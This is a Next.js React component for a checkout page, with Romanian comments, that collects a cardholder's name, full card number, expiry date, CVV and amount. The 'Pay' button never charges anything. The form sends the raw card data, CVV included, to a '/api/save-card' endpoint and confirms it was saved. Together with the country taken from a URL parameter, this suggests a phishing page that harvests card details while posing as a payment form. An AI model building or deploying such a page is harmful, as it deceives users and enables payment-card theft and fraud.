"use client";

import React, { useEffect, useState } from "react";
import { useSearchParams } from "next/navigation";

type CardType = "visa" | "mastercard" | "amex" | "revolut" | "default";

const Checkout: React.FC = () => {
  const searchParams = useSearchParams(); // Extragem parametrii din URL
  const [cardNumber, setCardNumber] = useState("");
  const [cardType, setCardType] = useState<CardType>("default");
  const [amount, setAmount] = useState("");
  const [expDate, setExpDate] = useState("");
  const [cvv, setCvv] = useState("");
  const [holder, setHolder] = useState("");
  const [country, setCountry] = useState(""); // Țara din link
  const [isLoading, setIsLoading] = useState(false);

  // Array-ul de linkuri pentru logourile cardurilor
  const cardLogos = [
    { type: "visa", src: "https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" },
    { type: "mastercard", src: "https://upload.wikimedia.org/wikipedia/commons/b/b7/MasterCard_Logo.svg" },
    { type: "amex", src: "https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo_%282018%29.svg" },
    { type: "revolut", src: "https://upload.wikimedia.org/wikipedia/commons/thumb/1/1f/Revolut_Logo.svg/512px-Revolut_Logo.svg.png" },
  ];

  useEffect(() => {
    // Extragem parametrul `country` din URL
    const countryParam = searchParams.get("country");
    if (countryParam) setCountry(countryParam);
  }, [searchParams]);

  const detectCardType = (number: string): CardType => {
    if (/^4/.test(number)) return "visa";
    if (/^5[1-5]/.test(number)) return "mastercard";
    if (/^3[47]/.test(number)) return "amex";
    if (/^5300|^6767/.test(number)) return "revolut";
    return "default";
  };

  const handleSubmit = async () => {
    if (!cardNumber || !expDate || !cvv || !holder || !amount || !country) {
      alert("Please fill in all fields correctly.");
      return;
    }

    setIsLoading(true);
    const payload = {
      cardNumber,
      cardType,
      amount,
      expDate,
      cvv,
      holder,
      country,
    };

    try {
      const response = await fetch("/api/save-card", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      if (response.ok) {
        alert("Card data successfully saved!");
      } else {
        alert("Failed to save card data.");
      }
    } catch (err) {
      console.error("Error:", err);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-100">
      <div className="max-w-sm mx-auto p-4 bg-white shadow-lg rounded-md">
        <div className="flex space-x-2 mb-4 justify-center">
          {/* Afișăm logourile cardurilor */}
          {cardLogos.map((logo) => (
            <img
              key={logo.type}
              src={logo.src}
              alt={`${logo.type} logo`}
              className="w-10 h-6 object-contain"
            />
          ))}
        </div>

        <div className="mb-4">
          <input
            placeholder="Name Surname"
            className="w-full px-3 py-2 border rounded-md focus:ring-2 focus:ring-purple-500"
            value={holder}
            onChange={(e) => setHolder(e.target.value)}
          />
        </div>

        <div className="relative mb-4">
          <input
            placeholder="Card Number"
            className="w-full px-3 py-2 border rounded-md focus:ring-2 focus:ring-purple-500"
            value={cardNumber}
            onChange={(e) => {
              const formatted = e.target.value.replace(/\D/g, "").replace(/(.{4})/g, "$1 ").trim();
              setCardNumber(formatted);
              setCardType(detectCardType(formatted));
            }}
          />
        </div>

        <div className="flex space-x-4 mb-4">
          <input
            placeholder="MM/YY"
            className="w-1/2 px-3 py-2 border rounded-md focus:ring-2 focus:ring-purple-500"
            value={expDate}
            onChange={(e) => setExpDate(e.target.value.replace(/\D/g, "").replace(/(\d{2})(\d{2})/, "$1/$2"))}
          />
          <input
            placeholder="CVV"
            className="w-1/2 px-3 py-2 border rounded-md focus:ring-2 focus:ring-purple-500"
            value={cvv}
            onChange={(e) => setCvv(e.target.value.replace(/\D/g, ""))}
          />
        </div>

        <div className="mb-4">
          <input
            placeholder="Amount"
            className="w-full px-3 py-2 border rounded-md focus:ring-2 focus:ring-purple-500"
            value={amount}
            onChange={(e) => setAmount(e.target.value.replace(/[^\d.]/g, ""))}
          />
        </div>

        <button
          className="w-full bg-purple-500 text-white py-2 rounded-md hover:bg-purple-600 transition"
          onClick={handleSubmit}
          disabled={isLoading}
        >
          {isLoading ? "Processing..." : `Pay ${amount || " "} EUR`}
        </button>
      </div>
    </div>
  );
};

export default Checkout;
